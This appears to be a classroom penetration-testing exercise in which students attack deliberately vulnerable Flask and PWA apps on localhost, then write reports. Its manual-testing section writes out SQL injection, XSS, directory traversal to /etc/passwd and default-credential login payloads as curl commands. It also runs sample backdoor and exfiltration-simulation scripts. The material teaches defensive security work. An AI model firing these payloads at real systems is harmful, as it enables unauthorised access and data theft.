# Penetration Testing Exercise

## üìñ Overview

Penetration testing is a comprehensive cybersecurity methodology that simulates cyberattacks to identify vulnerabilities and assess an organisation's security posture. This exercise integrates all previous security analysis methods (SAST, DAST, Network Analysis, and Sandbox Analysis) into a systematic approach for ethical security testing.

**Think of it this way:** If other security methods are like individual security cheques (door locks, alarm systems, security cameras), penetration testing is like hiring professional security consultants to test all your defences together and show you exactly how an attacker could break in.

**This exercise aligns with these syllabus points:**
- **6.1.2 Analyse security requirements** - Comprehensive security assessment integrating multiple methodologies
- **6.1.3 Analyse network security components** - Using network analysis within broader penetration testing framework
- **6.2.1 Implement secure network architecture** - Understanding security through systematic vulnerability assessment
- **6.2.2 Implement secure protocols** - Testing protocol security within complete attack scenarios

## üéØ Prerequisites

### Technical Requirements
- Completion of SAST, DAST, Network Analysis, and Sandbox exercises
- Understanding of ethical hacking principles and legal considerations
- Familiarity with cybersecurity testing methodologies

### Ethical Guidelines - CRITICAL
**‚ö†Ô∏è This exercise is for EDUCATIONAL PURPOSES ONLY**

**Before proceeding, students must understand:**
- Only test systems you own or have explicit written permission to test
- Stay within the defined scope (this sandbox environment only)  
- Document all activities for learning and accountability
- Never cause damage or disruption to systems or data
- NEVER use these techniques against systems you don't own

### Environment Setup
**Navigate to main folder:**
```bash
cd /workspaces/Secure_Architecture_Sandbox_Testing_Environment
```

**Start target applications:**
```bash
cd docker && docker-compose up -d
cd /workspaces/Secure_Architecture_Sandbox_Testing_Environment
sleep 10
```

**Verify applications are running:**
```bash
curl -I http://localhost:5000
curl -I http://localhost:9090
```

## üìã Activities

### Activity 1: Reconnaissance and Information Gathering

**Objective:** Gather comprehensive information about target environment using ethical techniques.

**Step 1: Network Discovery**
```bash
# Discover active services
python src/analyser/network_cli.py --scan-services localhost --educational

# Monitor network connections
python src/analyser/network_cli.py --monitor-connections --educational
```

**Step 2: Web Application Enumeration**
```bash
# Enumerate Flask app endpoints
python src/analyser/dast_cli.py http://localhost:5000 --deep-scan --educational

# Enumerate PWA app endpoints  
python src/analyser/dast_cli.py http://localhost:5000 --educational
```

**Step 3: Technology Stack Analysis**
```bash
# Analyse application code
python src/analyser/analyse_cli.py samples/unsecure-pwa --educational
python src/analyser/analyse_cli.py samples/vulnerable-flask-app --educational
```

**Expected Results:**
- Discovery of web services on ports 5000 and 9090
- Identification of Flask framework and Python technology stack
- Detection of administrative endpoints and debug features
- Initial security header analysis

### Activity 2: Comprehensive Vulnerability Assessment

**Objective:** Integrate SAST, DAST, Network Analysis, and Sandbox findings for comprehensive vulnerability assessment.

**Step 1: Static Analysis Integration**
```bash
# Comprehensive SAST scanning
python src/analyser/analyse_cli.py samples/unsecure-pwa --educational --output reports/pentest_sast_pwa.json
python src/analyser/analyse_cli.py samples/vulnerable-flask-app --educational --output reports/pentest_sast_flask.json
```

**Step 2: Dynamic Testing**
```bash
# Comprehensive DAST scanning
python src/analyser/dast_cli.py http://localhost:5000 --deep-scan --educational --output reports/pentest_dast_pwa.json  
python src/analyser/dast_cli.py http://localhost:9090 --deep-scan --educational --output reports/pentest_dast_flask.json
```

**Step 3: Network Traffic Analysis**
```bash
# Monitor network behaviour during testing
python src/analyser/network_cli.py --capture-traffic --duration 120 --educational --output reports/pentest_network.json
```

**Step 4: Sandbox Behavioural Analysis**
```bash
# Analyse suspicious application behaviour
python samples/backdoor-apps/backdoor_app.py &
sleep 5
python src/analyser/network_cli.py --monitor-connections --duration 60 --educational
```

**Expected Results:**
- Identification of SQL injection vulnerabilities in code
- Discovery of XSS vulnerabilities through dynamic testing
- Detection of missing security headers and misconfigurations
- Behavioural analysis showing suspicious network communications

### Activity 3: Automated Penetration Testing

**Objective:** Experience professional-grade automated penetration testing tools.

**Step 1: Automated Vulnerability Analysis**
```bash
# Run automated penetration testing tool
python src/analyser/penetration_analyser.py localhost:5000
python src/analyser/penetration_analyser.py localhost:9090
```

**Expected Output Example:**
```
Penetration Test Report for: localhost:5000
Total findings: 24
Risk level: HIGH
Critical: 3
High: 20
Medium: 1

[CRITICAL] SQL Injection in Parameter 'username'
[CRITICAL] Debug Console Exposed
[HIGH] Weak Authentication: admin:password
[MEDIUM] Missing CSRF Protection
```

**Step 2: Analyse Automated Results**
Document the automated findings and assess their accuracy and completeness.

### Activity 4: Manual Penetration Testing

**Objective:** Perform manual exploitation techniques to validate and extend automated findings.

**Step 1: Manual SQL Injection Testing**
```bash
# Test for SQL injection bypassing automated detection
curl -X POST "http://localhost:5000/login" \
  -d "username=admin' OR '1'='1&password=anything" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Test database enumeration
curl -X POST "http://localhost:5000/search" \
  -d "query=' UNION SELECT table_name FROM information_schema.tables--" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Step 2: Advanced XSS Testing**
```bash
# Test for XSS with evasion techniques
curl "http://localhost:5000/search?q=<script>alert('XSS')</script>"

# Test for stored XSS
curl -X POST "http://localhost:5000/comment" \
  -d "comment=<img src=x onerror=alert('Stored XSS')>" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Step 3: Configuration Exploitation**
```bash
# Test debug mode exploitation
curl "http://localhost:5000/debug" -v

# Test for directory traversal
curl "http://localhost:5000/file?name=../../../etc/passwd"

# Test authentication bypass
curl -X POST "http://localhost:5000/login" \
  -d "username=admin&password=admin" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Expected Results:**
- Successful SQL injection leading to authentication bypass
- XSS payload execution in application responses
- Access to debug information and configuration details
- Discovery of additional attack vectors missed by automated tools

### Activity 5: Post-Exploitation Analysis

**Objective:** Understand the full impact of successful exploitation.

**Step 1: Access Maintenance**
```bash
# Simulate persistence mechanisms
python samples/backdoor-apps/backdoor_app.py &

# Monitor persistent connections
python src/analyser/network_cli.py --monitor-connections --duration 60 --educational
```

**Step 2: Data Exfiltration Simulation**  
```bash
# Monitor exfiltration patterns
python samples/network-scenarios/backdoor_simulation.py 60 &
python src/analyser/network_cli.py --capture-traffic --duration 70 --educational
```

**Step 3: Impact Assessment**
Document the potential business impact of identified vulnerabilities and successful exploitation.

### Activity 6: Professional Reporting

**Objective:** Create comprehensive penetration testing documentation.

**Step 1: Compile Findings**
```bash
# Generate automated penetration testing reports  
python src/analyser/penetration_analyser.py localhost:5000 > reports/automated_pentest_pwa.txt
python src/analyser/penetration_analyser.py localhost:9090 > reports/automated_pentest_flask.txt

# Review all generated reports
ls -la reports/pentest_*
```

**Step 2: Create Executive Summary**
Write a 1-2 page executive summary including:
- Overview of testing methodology (automated + manual)
- Key security findings and business risk assessment
- Prioritised recommendations for remediation

**Step 3: Document Technical Findings**
Create detailed technical documentation including:
- Automated testing baseline results
- Manual testing validation and additional discoveries  
- Combined vulnerability analysis and attack scenarios
- Risk assessment matrix with exploitability and impact ratings

**Step 4: Professional Workflow Documentation**
Develop guidelines for:
- When to use automated vs manual testing approaches
- Integration strategies for comprehensive assessments
- Tool selection criteria and usage recommendations

## üìù Summary

### Key Concepts Learned
- **Penetration Testing Methodology**: Systematic approach combining automated and manual techniques
- **Automated vs Manual Testing**: Understanding when and why to use each approach
- **Vulnerability Integration**: Combining SAST, DAST, Network Analysis, and Sandbox findings
- **Ethical Guidelines**: Critical importance of permission, scope, and responsible disclosure
- **Professional Reporting**: Creating executive and technical documentation for different audiences

### Critical Security Testing Skills
- **Reconnaissance**: Systematic information gathering using multiple techniques
- **Vulnerability Assessment**: Integrating findings from multiple security testing methods
- **Exploitation Techniques**: Manual testing to validate and extend automated findings
- **Post-Exploitation Analysis**: Understanding full impact and business risk
- **Professional Communication**: Documenting findings for technical and business stakeholders

### Automated vs Manual Testing Insights
- **Automated Tools**: Excellent for baseline assessment, large-scale coverage, consistent results
- **Manual Testing**: Essential for business logic flaws, custom attacks, validation of findings
- **Combined Approach**: Professional penetration testing requires integration of both methods
- **Efficiency vs Depth**: Balancing time constraints with thoroughness requirements

### Real-World Applications
Penetration testing is essential for:
- Comprehensive security assessment programmes
- Compliance requirements and regulatory audits  
- Incident response and threat hunting activities
- Security programme maturity and improvement initiatives